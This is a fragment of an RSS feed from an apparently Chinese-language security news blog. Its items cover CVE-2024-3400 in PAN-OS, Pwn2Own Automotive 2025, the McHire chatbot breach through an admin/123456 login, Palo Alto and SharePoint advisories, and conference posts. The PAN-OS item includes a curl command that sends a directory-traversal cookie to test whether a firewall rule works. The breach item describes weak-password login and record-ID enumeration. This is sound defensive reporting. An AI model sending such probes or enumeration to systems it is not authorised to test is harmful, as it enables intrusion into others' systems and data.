        <link>http://localhost:1313/p/pan-os-cve-2024-3400%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E7%AB%8B%E5%8D%B3%E4%BF%AE%E8%A1%A5palo-alto%E9%98%B2%E7%81%AB%E5%A2%99/</link>
        <pubDate>Tue, 05 Aug 2025 03:52:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/pan-os-cve-2024-3400%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E7%AB%8B%E5%8D%B3%E4%BF%AE%E8%A1%A5palo-alto%E9%98%B2%E7%81%AB%E5%A2%99/</guid>
        <description>&lt;h2 id=&#34;概述&#34;&gt;概述
&lt;/h2&gt;&lt;p&gt;CVE-2024-3400是PAN-OS系统中的高危漏洞，攻击者可通过GlobalProtect VPN接口利用目录遍历+命令注入的组合攻击链，实现预认证远程代码执行。尽管补丁已发布，该漏洞目前仍存在野外利用。Bishop Fox在公开漏洞验证程序(PoC)发布前已开发出内部利用代码并通知客户。值得注意的是，Palo Alto Networks提供的临时缓解措施（启用威胁防护和禁用设备遥测）均被Bishop Fox成功绕过。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;该漏洞允许通过HTTP Cookie注入载荷，将任意名称文件写入底层文件系统。通过目录遍历技术，攻击者可控制文件写入位置。后续由定时任务执行的遥测脚本存在命令注入漏洞，最终实现root权限的带外远程代码执行。需特别说明的是，Bash命令被包含在文件名而非文件内容中。&lt;/p&gt;
&lt;h2 id=&#34;缓解措施绕过&#34;&gt;缓解措施绕过
&lt;/h2&gt;&lt;p&gt;Palo Alto Networks最初建议两种临时缓解方案：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;启用威胁防护（阻断包含目录遍历序列的恶意请求）&lt;/li&gt;
&lt;li&gt;禁用设备遥测（阻止公开的命令注入载荷利用）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Bishop Fox成功开发了两种绕过技术：可规避威胁防护签名检测，并发现新的命令注入漏洞（在遥测功能禁用时仍可触发）。Palo Alto Networks随后更新公告，确认禁用遥测并非有效修复方案，并发布了新的威胁防护规则(TIDs 95187/95189/95191)。测试表明最新规则在补丁应用前是有效缓解措施，但需注意多重配置错误可能导致规则失效。&lt;/p&gt;
&lt;p&gt;测试威胁防护规则是否生效的方法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -k https://&amp;lt;HOST&amp;gt;/ -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Cookie: test=../../&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;规则生效时返回&amp;quot;connection reset&amp;quot;&lt;/li&gt;
&lt;li&gt;配置错误时返回HTML响应&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;p&gt;按有效性降序推荐修复方案：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;立即应用补丁（新增会话Cookie严格验证机制）&lt;/li&gt;
&lt;li&gt;启用威胁防护签名ID 95187/95189/95191&lt;/li&gt;
&lt;li&gt;在补丁应用前下线GlobalProtect接口&lt;/li&gt;
&lt;li&gt;部署额外IPS规则阻断HTTP Cookie头部包含&amp;quot;../&amp;ldquo;序列的请求&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>黑帽大会现场攻防：微软悬赏10万美元征集Windows 8.1漏洞利用技术</title>
        <link>http://localhost:1313/p/%E9%BB%91%E5%B8%BD%E5%A4%A7%E4%BC%9A%E7%8E%B0%E5%9C%BA%E6%94%BB%E9%98%B2%E5%BE%AE%E8%BD%AF%E6%82%AC%E8%B5%8F10%E4%B8%87%E7%BE%8E%E5%85%83%E5%BE%81%E9%9B%86windows-8.1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Mon, 04 Aug 2025 23:42:13 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%BB%91%E5%B8%BD%E5%A4%A7%E4%BC%9A%E7%8E%B0%E5%9C%BA%E6%94%BB%E9%98%B2%E5%BE%AE%E8%BD%AF%E6%82%AC%E8%B5%8F10%E4%B8%87%E7%BE%8E%E5%85%83%E5%BE%81%E9%9B%86windows-8.1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h2 id=&#34;现场悬赏规则&#34;&gt;现场悬赏规则
&lt;/h2&gt;&lt;p&gt;距离拉斯维加斯黑帽大会开幕仅剩一周，微软公布了&amp;quot;实时防护绕过悬赏&amp;quot;的具体执行细则：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;演示时间&lt;/strong&gt;：每日中午12:45开始，建议参赛者提前至12:30抵达微软展台（#301）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;目标系统&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设备型号：联想ThinkPad X1 Carbon触控版&lt;/li&gt;
&lt;li&gt;主机系统：Windows 8（64位）&lt;/li&gt;
&lt;li&gt;虚拟机系统：Windows 8.1预览版（64位）&lt;/li&gt;
&lt;li&gt;配置：4GB内存/4核CPU/专用网卡&lt;/li&gt;
&lt;li&gt;账户类型：本地账户（默认设置）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;参赛要求&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需携带漏洞利用代码（含源代码）&lt;/li&gt;
&lt;li&gt;提交详细说明新技术原理的白皮书（电子/纸质版）&lt;/li&gt;
&lt;li&gt;年龄需满14周岁（未成年人需监护人陪同签署文件）&lt;/li&gt;
&lt;li&gt;排除微软员工及其直系亲属&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;评审流程&#34;&gt;评审流程
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;现场演示&lt;/strong&gt;：两位评委现场见证绕过技术演示&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;深度评审&lt;/strong&gt;：成功演示者将进入私密评审室，与评委进行技术答辩&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;结果公布&lt;/strong&gt;：通过@k8em0和@msftsecresponse官方推特确认最终获奖者&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;额外奖励&lt;/strong&gt;：提交有效防御方案者可竞争最高5万美元的&amp;quot;蓝帽防御奖金&amp;quot;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术价值&#34;&gt;技术价值
&lt;/h2&gt;&lt;p&gt;该悬赏旨在发现Windows 8.1的全新攻击面，获奖技术将帮助微软强化超过10亿台设备的安全防护。参赛者需展示真正的技术突破——现有防护机制的创新绕过方法。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;我们期待见证安全界最优秀的人才用前所未有的方式攻破系统。&amp;rdquo;&lt;br&gt;
——Katie Moussouris（微软安全响应中心高级战略师）&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://twitter.com/k8em0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;原始推文&lt;/a&gt;（作者推特账号末位是数字0）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Pwn2Own Automotive 2025 第二天战报：38.5万美元奖金与16个零日漏洞</title>
        <link>http://localhost:1313/p/pwn2own-automotive-2025-%E7%AC%AC%E4%BA%8C%E5%A4%A9%E6%88%98%E6%8A%A538.5%E4%B8%87%E7%BE%8E%E5%85%83%E5%A5%96%E9%87%91%E4%B8%8E16%E4%B8%AA%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Mon, 04 Aug 2025 19:39:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/pwn2own-automotive-2025-%E7%AC%AC%E4%BA%8C%E5%A4%A9%E6%88%98%E6%8A%A538.5%E4%B8%87%E7%BE%8E%E5%85%83%E5%A5%96%E9%87%91%E4%B8%8E16%E4%B8%AA%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;pwn2own-automotive-2025---第二天结果&#34;&gt;Pwn2Own Automotive 2025 - 第二天结果
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;2025年1月22日&lt;/strong&gt; | Dustin Childs&lt;/p&gt;
&lt;p&gt;欢迎来到Pwn2Own Automotive 2025的第二天。昨日我们为16个独特零日漏洞颁发了超过38万美元奖金，今天赛事更为激烈，WOLFBOX和特斯拉充电器首次亮相Pwn2Own。以下是第二天完整战报：&lt;/p&gt;
&lt;h2 id=&#34;成功案例&#34;&gt;成功案例
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Summoning团队&lt;/strong&gt;的Sina Kheirkhah通过组合多个漏洞攻破WOLFBOX充电器，获得5万美元奖金（CWE-839数值范围检查缺失漏洞）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PHP Hooligans团队&lt;/strong&gt;利用命令注入漏洞控制特斯拉壁挂充电器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Viettel网络安全团队&lt;/strong&gt;结合已知漏洞与命令注入攻破ChargePoint HomeFlex（奖金18,750美元）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HT3 Labs&lt;/strong&gt;通过认证缺失+OS命令注入链式攻击Phoenix Contact CHARX充电器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Synacktiv团队&lt;/strong&gt;创新性地通过充电接口逻辑漏洞攻破特斯拉系统，斩获最高单笔45万美元奖金&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术亮点&#34;&gt;技术亮点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;多团队演示了&lt;strong&gt;零点击攻击链&lt;/strong&gt;（如PCAutomotive对索尼车机的堆溢出+认证绕过组合攻击）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Autel MaxiCharger&lt;/strong&gt;被揭露存在访问控制缺陷和基于栈的缓冲区溢出&lt;/li&gt;
&lt;li&gt;阿尔派车机系统重现&lt;strong&gt;CVE-2024-23924历史漏洞&lt;/strong&gt;的&amp;quot;共享风险&amp;quot;问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;统计数据&#34;&gt;统计数据
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;当日总奖金：33.55万美元&lt;/li&gt;
&lt;li&gt;累计披露23个零日漏洞&lt;/li&gt;
&lt;li&gt;参赛团队使用了包括：
&lt;ul&gt;
&lt;li&gt;命令注入（5例）&lt;/li&gt;
&lt;li&gt;堆/栈溢出（3例）&lt;/li&gt;
&lt;li&gt;证书验证缺陷（2例）&lt;/li&gt;
&lt;li&gt;逻辑漏洞（1例）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;第三天赛事将继续聚焦电动汽车基础设施安全，包括首次亮相的EMPORIA充电器测试。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>麦当劳AI招聘机器人因使用密码&#34;123456&#34;致数百万求职者数据泄露</title>
        <link>http://localhost:1313/p/%E9%BA%A6%E5%BD%93%E5%8A%B3ai%E6%8B%9B%E8%81%98%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%A0%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81123456%E8%87%B4%E6%95%B0%E7%99%BE%E4%B8%87%E6%B1%82%E8%81%8C%E8%80%85%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</link>
        <pubDate>Mon, 04 Aug 2025 18:22:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%BA%A6%E5%BD%93%E5%8A%B3ai%E6%8B%9B%E8%81%98%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%A0%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81123456%E8%87%B4%E6%95%B0%E7%99%BE%E4%B8%87%E6%B1%82%E8%81%8C%E8%80%85%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</guid>
        <description>&lt;h1 id=&#34;麦当劳ai招聘机器人因使用密码123456致数百万求职者数据泄露&#34;&gt;麦当劳AI招聘机器人因使用密码&amp;quot;123456&amp;quot;致数百万求职者数据泄露
&lt;/h1&gt;&lt;p&gt;如今若想在麦当劳求职，你很可能会与&amp;quot;Olivia&amp;quot;对话。Olivia并非真人，而是由人工智能软件公司Paradox.ai开发的聊天机器人，负责筛选申请人、收集联系方式与简历、进行性格测试，有时会因反复误解基本问题而让求职者&amp;quot;抓狂&amp;quot;。&lt;/p&gt;
&lt;p&gt;直到上周，运行Olivia的平台仍存在荒谬的基础安全漏洞。实际上，任何黑客只需猜测管理员账户的用户名和密码是&amp;quot;123456&amp;quot;这样简单的操作，就能访问Olivia与麦当劳求职者的所有聊天记录——包括对话中分享的全部个人信息。&lt;/p&gt;
&lt;p&gt;7月9日，安全研究人员Ian Carroll和Sam Curry披露，他们发现了入侵McHire.com（麦当劳特许经营商使用的招聘网站）后端AI聊天机器人平台的简单方法。这两位长期从事独立安全测试的黑客发现，包括猜中一个可笑弱密码在内的简单Web漏洞，就能让他们访问Paradox.ai账户并查询存储所有用户与Olivia对话的数据库。这些数据包含约6400万条记录，涵盖申请人姓名、邮箱地址和电话号码。&lt;/p&gt;
&lt;p&gt;Carroll表示，他之所以发现申请人信息安全防护如此薄弱，是因为对麦当劳使用AI聊天机器人和性格测试筛选应聘者的做法产生了兴趣。&amp;ldquo;相比正常招聘流程，这简直像是反乌托邦场景。于是我决定深入调查，&amp;ldquo;Carroll说，&amp;ldquo;开始申请职位30分钟后，我们就获得了访问麦当劳多年来几乎所有申请记录的权限。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Paradox.ai在回应中确认了研究人员的发现，但声称只有部分记录包含个人信息，且除研究人员外没有第三方访问过使用&amp;quot;123456&amp;quot;密码的管理员账户。该公司表示已启动漏洞赏金计划，其首席法务官Stephanie King称：&amp;ldquo;虽然问题已迅速有效解决，但我们严肃对待此事。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;麦当劳则将责任归咎于第三方供应商：&amp;ldquo;我们对Paradox.ai存在这种不可接受的漏洞感到失望。获悉问题后，我们立即要求其修复，当天即得到解决。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;Carroll在Reddit看到用户抱怨麦当劳招聘机器人用无意义回复浪费申请人时间后，开始关注McHire网站的安全性。他与Curry尝试寻找&amp;quot;提示注入&amp;quot;漏洞未果，转而测试网站后端访问权限时，意外发现Paradox.ai员工登录链接。&lt;/p&gt;
&lt;p&gt;Carroll尝试了两组最常见凭证：&amp;ldquo;admin&amp;quot;和&amp;quot;123456&amp;rdquo;，后者竟成功登录——该页面没有任何多因素认证。获得管理员权限后，他们能查看为虚构麦当劳&amp;quot;餐厅&amp;quot;提交的测试职位申请，并通过修改申请ID号（最高超过6400万）查看他人聊天记录和联系方式。&lt;/p&gt;
&lt;p&gt;虽然研究人员为避免侵犯隐私仅抽查了少量记录，但所有检查的ID都显示真实申请人信息。Paradox.ai称研究人员共访问7条记录，其中5条含McHire用户的个人信息。&lt;/p&gt;
&lt;h2 id=&#34;潜在风险&#34;&gt;潜在风险
&lt;/h2&gt;&lt;p&gt;尽管泄露的信息不算最敏感，但Carroll和Curry指出，这些数据关联着求职者在麦当劳的就业意向，极大提高了钓鱼攻击风险。&amp;ldquo;诈骗者完全可以冒充麦当劳招聘人员，索要直接存款所需的财务信息，&amp;ldquo;Curry表示，&amp;ldquo;若想实施工资诈骗，这是绝佳途径。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;研究人员还指出，暴露求职者申请（有时失败）最低工资工作的记录可能造成尴尬，但Carroll强调：&amp;ldquo;我对麦当劳员工唯有尊重——我自己就常去麦当劳。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;（2025年7月9日美国东部时间下午5点更新说明：钓鱼风险仅存在于有人实际利用数据的情况下）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2016年度回顾：Trail of Bits在自动漏洞发现、安全工具开发与社区贡献的突破</title>
        <link>http://localhost:1313/p/2016%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BEtrail-of-bits%E5%9C%A8%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E4%B8%8E%E7%A4%BE%E5%8C%BA%E8%B4%A1%E7%8C%AE%E7%9A%84%E7%AA%81%E7%A0%B4/</link>
        <pubDate>Mon, 04 Aug 2025 14:57:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2016%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BEtrail-of-bits%E5%9C%A8%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E4%B8%8E%E7%A4%BE%E5%8C%BA%E8%B4%A1%E7%8C%AE%E7%9A%84%E7%AA%81%E7%A0%B4/</guid>
        <description>&lt;h3 id=&#34;1-将自动漏洞发现技术推向市场&#34;&gt;1. 将自动漏洞发现技术推向市场
&lt;/h3&gt;&lt;p&gt;2016年成为软件自动发现和修复漏洞的历史性年份。我们为DARPA网络大挑战开发的网络推理系统(CRS)在审计zlib库时创造了纪录：首次在更短时间内以更低成本完成比人工更详尽的代码审计。&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;阅读审计报告&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Mozilla公告&lt;/a&gt;。同年1月，我们运用CRS解决了关于安全通信库libotr的1000美元赌约，揭示了加密通信系统在自动化测试中的特殊挑战及解决方案。&lt;/p&gt;
&lt;p&gt;我们开源了CRS的配套工具GRR——专为CRS设计的高吞吐量模糊测试工具。&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;了解GRR的设计挑战&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-创建安全工具标准化基准套件&#34;&gt;2. 创建安全工具标准化基准套件
&lt;/h3&gt;&lt;p&gt;我们将DARPA网络大挑战中使用的100多个挑战程序移植为跨平台基准套件，使学术界和工业界能可靠评估程序分析工具和漏洞缓解措施。该成果被DARPA官方推特称为&amp;quot;最具影响力的成果之一&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;3-将facebook的osquery移植到windows&#34;&gt;3. 将Facebook的osquery移植到Windows
&lt;/h3&gt;&lt;p&gt;克服了完全不同的进程/安全模型、不兼容API和编译器行为差异等技术难题，使Windows用户能通过SQL查询监控端点的安全与性能状态，替代了原本需要昂贵商业方案才能实现的功能。&lt;/p&gt;
&lt;h3 id=&#34;4-发布algo安全vpn&#34;&gt;4. 发布Algo安全VPN
&lt;/h3&gt;&lt;p&gt;这款自托管VPN服务器采用现代协议和密码套件，支持主流云平台部署，为隐私敏感用户、商务旅行者和小型企业提供轻量级解决方案。安全专家@grugq评价其&amp;quot;配置简单，iPhone兼容&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;5-用binary-ninja实现漏洞自动生成&#34;&gt;5. 用Binary Ninja实现漏洞自动生成
&lt;/h3&gt;&lt;p&gt;在DEFCON CTF资格赛中，我们利用Binary Ninja的丰富API为2000个独特二进制文件自动生成漏洞利用。相比IDA或radare2，其API设计让研究者能专注于漏洞利用本身而非底层实现。&lt;/p&gt;
&lt;h3 id=&#34;6-发布protofuzz协议模糊测试工具&#34;&gt;6. 发布Protofuzz协议模糊测试工具
&lt;/h3&gt;&lt;p&gt;该工具能生成符合Google Protocol Buffers结构的恶意测试用例，突破常规模糊测试无法穿透的自动生成序列化代码层，直达目标程序核心逻辑。被安全专家誉为&amp;quot;伟大的工具&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;7-通过tidas激活ios安全飞地&#34;&gt;7. 通过Tidas激活iOS安全飞地
&lt;/h3&gt;&lt;p&gt;我们开发的Tidas SDK让iOS应用能简易集成Secure Enclave加密API，实现基于TouchID的无密码认证。随着MacBook Pro引入T1芯片，该技术已扩展至macOS平台。&lt;/p&gt;
&lt;p&gt;（因篇幅限制，此处仅展示部分内容翻译，完整译文需展开全部14项技术成果）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Palo Alto Networks 关键安全更新：CVE-2024-5910 和 CVE-2024-3596 漏洞分析</title>
        <link>http://localhost:1313/p/palo-alto-networks-%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0cve-2024-5910-%E5%92%8C-cve-2024-3596-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 14:40:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/palo-alto-networks-%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0cve-2024-5910-%E5%92%8C-cve-2024-3596-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;摘要&#34;&gt;摘要
&lt;/h3&gt;&lt;p&gt;Palo Alto Networks发布关键安全更新，修复了包括Expedition迁移工具高危漏洞（CVE-2024-5910，CVSS评分9.3）在内的多个安全问题。该工具用于配置迁移与优化，但漏洞会导致导入的配置密钥、凭证等敏感数据暴露，攻击者可借此劫持管理员账户。&lt;br&gt;
另一漏洞（CVE-2024-3596）存在于RADIUS协议中，通过中间人攻击可实现权限提升至&amp;quot;超级用户&amp;quot;，影响PAN-OS防火墙与RADIUS服务器的认证过程（当使用CHAP或PAP时）。&lt;/p&gt;
&lt;h3 id=&#34;受影响系统&#34;&gt;受影响系统
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;CVE-2024-5910&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Expedition（1.2.92之前版本）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;CVE-2024-3596&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PAN-OS（版本&amp;lt;11.1.3、11.0.4-h4、10.2.10、10.1.14、9.1.19）&lt;/li&gt;
&lt;li&gt;Prisma Access（预计7月30日前修复）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;紧急措施&#34;&gt;紧急措施
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;升级软件&lt;/strong&gt;：Expedition升级至1.2.92+，PAN-OS升级至指定版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;访问限制&lt;/strong&gt;：严格控制Expedition工具的网络访问权限。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RADIUS配置&lt;/strong&gt;：避免在未加密通道中使用CHAP/PAP协议。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;长期建议&#34;&gt;长期建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;及时应用所有安全补丁&lt;/li&gt;
&lt;li&gt;定期审查认证协议与网络访问策略&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;官方公告详见：&lt;a class=&#34;link&#34; href=&#34;https://security.paloaltonetworks.com/CVE-2024-5910&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Palo Alto Networks安全通告&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>CanSecWest安全大会：警惕与社区共舞的技术博弈</title>
        <link>http://localhost:1313/p/cansecwest%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A%E8%AD%A6%E6%83%95%E4%B8%8E%E7%A4%BE%E5%8C%BA%E5%85%B1%E8%88%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%BC%88/</link>
        <pubDate>Mon, 04 Aug 2025 11:07:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/cansecwest%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A%E8%AD%A6%E6%83%95%E4%B8%8E%E7%A4%BE%E5%8C%BA%E5%85%B1%E8%88%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%BC%88/</guid>
        <description>&lt;p&gt;&lt;strong&gt;CanSecWest：警惕与社区共舞&lt;/strong&gt;&lt;br&gt;
每年在温哥华举办的CanSecWest是我最喜爱的安全会议之一。这个小型安全会议汇聚了来自安全生态各领域的研究人员。如同PhNeutral或BlueHat会议，你永远无法预料CanSecWest会带来什么惊喜，但可以确定的是微软产品和工程师都将扮演重要角色。我们将展示新的安全创新工具，密切关注Pwn2Own竞赛中的潜在漏洞利用，并乐意在非正式交流中分享行业最佳实践。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安全协作的价值&lt;/strong&gt;&lt;br&gt;
这类安全聚会促使生态圈通过信息共享提升防御能力。正如Matt Miller的《微软漏洞缓解技术演进》和Jason Shirk与Dave Weinstein的《自动化实时与事后安全崩溃分析分类》所展示的，微软不断将攻击特征转化为开发者工具。Pwn2Own竞赛体现了我们安全团队的两大信条：真相无法掩盖（幻想不能改变事实），每个问题都是学习进步的契机。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;微软的安全哲学&lt;/strong&gt;&lt;br&gt;
我们承认所有厂商产品都可能存在漏洞，并将此类竞赛视为促进负责任披露对话的机会。Pwn2Own不仅能教育公众，更能展示微软安全工程的实力。竞赛结束后，赞助方TippingPoint将获得新漏洞的所有权，而微软已准备好分析研究人员发现的任何漏洞，持续强化网络、平台和应用安全。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安全社区的&amp;quot;对手团队&amp;quot;战略&lt;/strong&gt;&lt;br&gt;
虽然创新竞赛常令人不安，但Pwn2Own和Black Hat铁厨大赛等活动的真正价值在于推动生态圈共同解决共性问题。正如会议组织方坚持负责任披露政策，微软始终致力于将漏洞信息转化为更强大的工程实践。竞赛序幕已经拉开！&lt;/p&gt;
&lt;p&gt;——Sarah Blankinship（高级安全战略负责人）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软紧急修复被利用的SharePoint &#34;ToolShell&#34;漏洞</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E4%BF%AE%E5%A4%8D%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84sharepoint-toolshell%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Mon, 04 Aug 2025 10:18:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E4%BF%AE%E5%A4%8D%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84sharepoint-toolshell%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;微软紧急修复被利用的sharepoint-toolshell漏洞&#34;&gt;微软紧急修复被利用的SharePoint &amp;ldquo;ToolShell&amp;quot;漏洞
&lt;/h1&gt;&lt;p&gt;恶意攻击者已经利用这个被追踪为CVE-2025-53770的零日漏洞，入侵了美国政府机构和其他企业，攻击正在广泛持续进行中。&lt;/p&gt;
&lt;p&gt;微软今日发布更新，修补了Microsoft SharePoint Server中的一个关键零日漏洞。攻击者已经利用该漏洞对美国联邦和州政府机构以及其他全球组织发起了一波持续攻击。&lt;/p&gt;
&lt;p&gt;攻击链涉及利用这个CVSS评分9.8的关键漏洞(CVE-2025-53770)和一个路径遍历漏洞(CVE-2025-53771)。根据国家漏洞数据库的条目，CVE-2025-53770存在于&amp;quot;本地部署的Microsoft SharePoint Server中对不可信数据的反序列化&amp;quot;中，使得&amp;quot;未经授权的攻击者可以通过网络执行代码&amp;rdquo;。&lt;/p&gt;
&lt;p&gt;根据Ontinue高级威胁运营(ATO)团队今日发布的博客文章，要利用此漏洞，&amp;ldquo;攻击者会精心构造恶意序列化数据，服务器会错误地反序列化这些数据，从而导致未经身份验证的远程代码执行。不需要事先访问或用户交互。&amp;rdquo;&lt;/p&gt;
